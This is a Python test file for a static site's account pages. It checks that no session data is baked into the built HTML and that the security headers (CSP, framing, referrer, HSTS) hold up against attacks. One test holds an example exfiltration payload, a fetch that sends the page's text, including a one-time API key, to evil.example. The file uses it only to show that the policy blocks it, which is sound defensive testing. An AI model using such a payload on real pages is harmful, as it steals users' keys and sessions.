# site/tests/test_account_pages.py
# ruff: noqa: E501  -- asserted spans are real page/markup lines; wrapping changes what is tested
"""Task 11 — the account surface (`/login/`, `/account/`, `/keys/`, `/usage/`) wired
to `explorer-api`.

The site stays static. Nothing on these four routes is rendered from a session:
the page ships an empty island and a signed-out fallback, and every byte of user
data arrives later, in the browser, from the API, behind the session cookie. So a
signed-out visitor — and every crawler, and the `.md` twin, and the llms family —
sees exactly what step 2 shipped.
"""
import base64
import hashlib
import re
import sys
from pathlib import Path

SITE = Path(__file__).resolve().parents[1]
DIST = SITE / "dist"
sys.path.insert(0, str(SITE / "tools"))
import twins  # noqa: E402

# component 13 §5 / the plan's `PUBLIC_API_URL` default: the API is a different
# origin from the site, and it is a build-time setting, not a runtime lookup.
DEFAULT_API = "https://api.llms-explorer.com"
PAGES = ("login", "account", "keys", "usage")
NAV = SITE / "src/components/AccountNav.astro"
TITLE_RE = re.compile(r'^const title = "([^"]+)";', re.MULTILINE)
DESC_RE = re.compile(r'^const description = "([^"]+)";', re.MULTILINE)


def _src(name: str) -> str:
    return (SITE / "src/pages" / f"{name}.astro").read_text(encoding="utf-8")


def _built(name: str) -> str:
    return (DIST / name / "index.html").read_text(encoding="utf-8")


def _frontmatter(src: str) -> str:
    """Everything between the two `---` fences — the part that runs at build time."""
    assert src.startswith("---\n"), "an .astro page opens with its frontmatter fence"
    return src.split("\n---\n", 1)[0]


def _scripts(src: str) -> str:
    return "\n".join(re.findall(r"<script[^>]*>(.*?)</script>", src, re.S))


def test_every_account_route_is_built():
    for name in PAGES:
        assert (DIST / name / "index.html").is_file(), f"/{name}/ is not built"


def test_signed_out_markup_carries_no_user_data():
    """The island mount ships empty and hidden; the only thing in the HTML is the
    signed-out fallback. Nothing that could only come from a session — an address,
    a key, a balance — may be baked into a statically built page."""
    for name in PAGES:
        html = _built(name)
        mounts = re.findall(r'data-island="([a-z-]+)"[^>]*>', html)
        assert mounts, f"/{name}/ has no island mount"
        for island in mounts:
            assert re.search(rf'data-island="{island}"[^>]*></div>', html), (
                f"/{name}/: the {island} island ships with content in it")
            assert re.search(rf'data-island="{island}"[^>]*\bhidden\b', html), (
                f"/{name}/: the {island} island is not hidden until the API answers")
        assert "llmsx_" not in html, f"/{name}/ carries something shaped like an API key"
        assert "data-signed-out" in html, f"/{name}/ has no signed-out fallback"


def test_no_account_page_reaches_the_api_at_build_time():
    """A static page that fetched at build time would bake one visitor's data into
    every visitor's HTML."""
    for name in PAGES:
        fm = _frontmatter(_src(name))
        assert "fetch(" not in fm, f"{name}.astro fetches in its frontmatter"
        assert "await" not in fm, f"{name}.astro awaits in its frontmatter"
    assert "fetch(" not in _frontmatter(NAV.read_text(encoding="utf-8"))


def test_every_account_page_is_an_island_that_sends_the_session_cookie():
    for name in PAGES:
        script = _scripts(_src(name))
        assert script.strip(), f"{name}.astro has no client island"
        assert "fetch(" in script, f"{name}.astro's island calls nothing"
        assert 'credentials: "include"' in script, (
            f"{name}.astro's island drops the session cookie on the cross-origin call")
        assert "/api/" in script, f"{name}.astro's island names no API route"


def test_the_api_origin_is_one_build_time_setting():
    """`PUBLIC_API_URL` is read once, in the shared nav, and published to the
    islands as a data attribute — so the default cannot drift across four pages."""
    nav = NAV.read_text(encoding="utf-8")
    assert "import.meta.env.PUBLIC_API_URL" in nav
    assert DEFAULT_API in nav
    for name in PAGES:
        assert DEFAULT_API not in _src(name), f"{name}.astro repeats the API default"
        assert "PUBLIC_API_URL" not in _src(name), f"{name}.astro reads the env itself"
        assert f'data-api="{DEFAULT_API}"' in _built(name), (
            f"/{name}/ does not publish the API origin its island reads")


def test_every_account_page_carries_the_shared_nav():
    for name in PAGES:
        html = _built(name)
        for route in ("/account/", "/keys/", "/usage/", "/login/"):
            assert f'href="{route}"' in html, f"/{name}/ does not link {route}"


def test_each_account_page_advertises_and_publishes_its_twin():
    for name in PAGES:
        assert f'<link rel="alternate" type="text/markdown" href="/{name}.md"' in _built(name)
        assert (DIST / f"{name}.md").is_file(), f"/{name}.md advertised but not built"


def test_twin_titles_and_descriptions_match_the_pages():
    """The twin is the page's entry in llms.txt. If the two drift, the index
    describes a page that does not exist under that name."""
    specs = {s["route"]: s for s in twins.STATIC_PAGES}
    for name in PAGES:
        spec = specs[f"/{name}/"]
        src = (SITE / spec["page"]).read_text(encoding="utf-8")
        assert spec["page"] == f"src/pages/{name}.astro"
        assert TITLE_RE.search(src).group(1) == spec["title"], name
        assert DESC_RE.search(src).group(1) == spec["description"], name


def test_the_account_twins_reach_the_family_index():
    index = (DIST / "overview" / "llms.txt").read_text(encoding="utf-8")
    for spec in twins.STATIC_PAGES:
        assert f"[{spec['title']}]" in index, spec["route"]
        assert spec["route"] in index, spec["route"]
        assert spec["description"] in index, spec["route"]


def test_the_family_still_lints_zero_high():
    sys.path.insert(0, str(SITE.parent / "hub" / "scripts"))
    import llms_lint  # noqa: PLC0415
    for name in ("llms.txt", "llms-full.txt", "llms-small.txt",
                 "llms-facts.txt", "llms-vocabulary.txt"):
        findings = llms_lint.check(DIST / name)["findings"]
        high = [f for f in findings if f["severity"] == "high"]
        assert not high, (name, high[:3])


def test_the_readme_documents_the_account_surface():
    readme = (SITE / "README.md").read_text(encoding="utf-8")
    assert "PUBLIC_API_URL" in readme and DEFAULT_API in readme
    for route in ("/login/", "/account/", "/keys/", "/usage/"):
        assert route in readme, route


# --- The response headers, read from the attacker's side ----------------------
#
# Step 3 turns a static docs site into an authenticated surface: `/keys/` paints
# a freshly minted key into the DOM once ("it is not shown again"), and all four
# islands hold a live session cookie. Two attacks follow from that, and both are
# refused by the headers rather than by anything on the page — so the headers are
# what these tests attack.

def _headers_rules(text: str) -> list[tuple[str, list[tuple[str, str]]]]:
    """`_headers` as [(path pattern, [(header, value)])], in file order."""
    rules: list[tuple[str, list[tuple[str, str]]]] = []
    for line in text.splitlines():
        if not line.strip():
            continue
        if line.startswith("/"):
            rules.append((line.strip(), []))
        else:
            name, _, value = line.strip().partition(":")
            rules[-1][1].append((name.strip(), value.strip()))
    return rules


def _served(text: str, path: str) -> dict[str, str]:
    """What a visitor to `path` receives. Cloudflare Pages applies EVERY matching
    rule, so a header only protects a route if some matching rule carries it."""
    out: dict[str, str] = {}
    for pattern, headers in _headers_rules(text):
        if re.fullmatch(re.escape(pattern).replace(r"\*", ".*"), path):
            for name, value in headers:
                out[name.lower()] = value
    return out


def _directives(csp: str) -> dict[str, str]:
    return {d.split(" ", 1)[0]: d for d in (p.strip() for p in csp.split(";")) if d}


def _csp_for(path: str) -> dict[str, str]:
    # Regenerated from the current build rather than read from whatever the last
    # `npm run build` left behind: this asserts the policy the tool would ship.
    text = twins.write_headers(DIST).read_text(encoding="utf-8")
    served = _served(text, path)
    assert "content-security-policy" in served, f"{path} is served with no CSP"
    return _directives(served["content-security-policy"])


def test_an_attacker_cannot_frame_the_keys_page_and_steal_a_click():
    """Attack: evil.example iframes /keys/, covers it with its own UI, and lands
    the victim's click on Create (minting a key the attacker reads) or Revoke."""
    for path in ("/keys/", "/account/", "/usage/", "/login/"):
        csp = _csp_for(path)
        assert csp.get("frame-ancestors") == "frame-ancestors 'none'", (
            f"{path} can be framed: {csp.get('frame-ancestors')}")
        served = _served(twins.write_headers(DIST).read_text(encoding="utf-8"), path)
        assert served.get("x-frame-options", "").upper() == "DENY", (
            f"{path} has no X-Frame-Options for browsers that predate frame-ancestors")


def test_an_injected_script_cannot_run_and_read_the_one_time_key():
    """Attack: anything that gets markup onto this origin — a stored payload in a
    directory entry, a compromised build artifact — injects an inline script to
    read the plaintext key out of the DOM. Its hash is not one we published, and
    there is no `'unsafe-inline'`, so the browser refuses to execute it."""
    payload = b"fetch('https://evil.example/?k='+document.body.innerText)"
    injected = "'sha256-" + base64.b64encode(hashlib.sha256(payload).digest()).decode() + "'"
    script_src = _csp_for("/keys/")["script-src"]
    assert "'unsafe-inline'" not in script_src, "an injected inline script would run"
    assert "'unsafe-eval'" not in script_src
    assert injected not in script_src
    assert " *" not in f" {script_src} " and "https:" not in script_src, (
        f"script-src admits foreign origins: {script_src}")


def test_the_pages_own_island_survives_that_policy():
    """The other half of the same claim: a policy that also blanks /keys/ is not a
    fix. Every inline script Astro emitted must be hashed into `script-src`."""
    script_src = _csp_for("/keys/")["script-src"]
    hashes = twins.inline_script_hashes(DIST)
    assert hashes, "no inline scripts found in dist — has the site been built?"
    for h in hashes:
        assert h in script_src, f"an inline script Astro emitted is not allowed: {h}"


def test_a_running_script_cannot_exfiltrate_the_session_or_the_key():
    """Attack: script that does get in (an injected `src=`, a poisoned dependency)
    posts the key or the session's answers to a host of the attacker's choosing."""
    csp = _csp_for("/keys/")
    assert csp["connect-src"] == f"connect-src 'self' {DEFAULT_API}", csp["connect-src"]
    assert csp["default-src"] == "default-src 'self'"
    assert csp["base-uri"] == "base-uri 'none'", "a base tag could reroute every fetch"
    assert csp["form-action"] == "form-action 'self'", "a form could POST the key away"
    assert csp["object-src"] == "object-src 'none'"


def test_the_key_does_not_leak_by_referer_sniffing_or_mime_confusion():
    served = _served(twins.write_headers(DIST).read_text(encoding="utf-8"), "/keys/")
    assert served.get("referrer-policy") == "no-referrer", (
        "the URL of the page holding the key travels to every outbound link")
    assert served.get("x-content-type-options") == "nosniff"
    hsts = served.get("strict-transport-security", "")
    assert "max-age=" in hsts and int(re.search(r"max-age=(\d+)", hsts).group(1)) >= 31536000, (
        f"a downgrade to http would hand over the session cookie: {hsts!r}")


def test_the_security_headers_cost_one_rule_not_one_per_route():
    """Cloudflare caps `_headers` at 100 rules and the per-file token counts spend
    most of them; a per-route policy would push the file over the cap as pages are
    added, and the build would start failing instead of the site being protected."""
    text = twins.write_headers(DIST).read_text(encoding="utf-8")
    carriers = [p for p, headers in _headers_rules(text)
                if any(n.lower() == "content-security-policy" for n, _ in headers)]
    assert carriers == ["/*"], carriers


# --- The /usage/ island reads the API's field names, not names of its own -----

def test_the_usage_island_reads_only_fields_the_api_returns():
    """A dashboard that reads `usage.credits_usd` off a body that carries
    `credit_balance_usd` prints "0 USD of credit left" to an account holding $50,
    and never errors. 15 §9's bar — dashboard numbers equal `/api/usage`
    aggregates — is only met if every name the island reads is in the contract."""
    sys.path.insert(0, str(SITE.parent / "api"))
    from explorer_api.routes.usage import UsageOut, UsageRowOut  # noqa: PLC0415

    script = _scripts(_src("usage"))
    summary = set(UsageOut.model_json_schema()["properties"])
    row = set(UsageRowOut.model_json_schema()["properties"])
    read_summary = set(re.findall(r"\busage\.([A-Za-z_]\w*)", script))
    read_row = set(re.findall(r"\bentry\.([A-Za-z_]\w*)", script))

    assert read_summary and read_row, "the island reads nothing — did the fetch move?"
    assert read_summary <= summary, f"/usage/ reads fields UsageOut never sends: {read_summary - summary}"
    assert read_row <= row, f"/usage/ reads row fields UsageRowOut never sends: {read_row - row}"


def test_the_usage_money_column_shows_what_was_billed():
    """A row whose verify gate failed is priced but not billed (15 §8). Printing
    `price_usd` under a heading like "Cost" bills the reader for work the ledger
    did not charge them for."""
    script = _scripts(_src("usage"))
    assert "entry.billable_usd" in script, "/usage/ never shows what was actually billed"
    assert "Billed (USD)" in script and "List (USD)" in script, (
        "the money columns are unlabelled or still claim to be the cost")
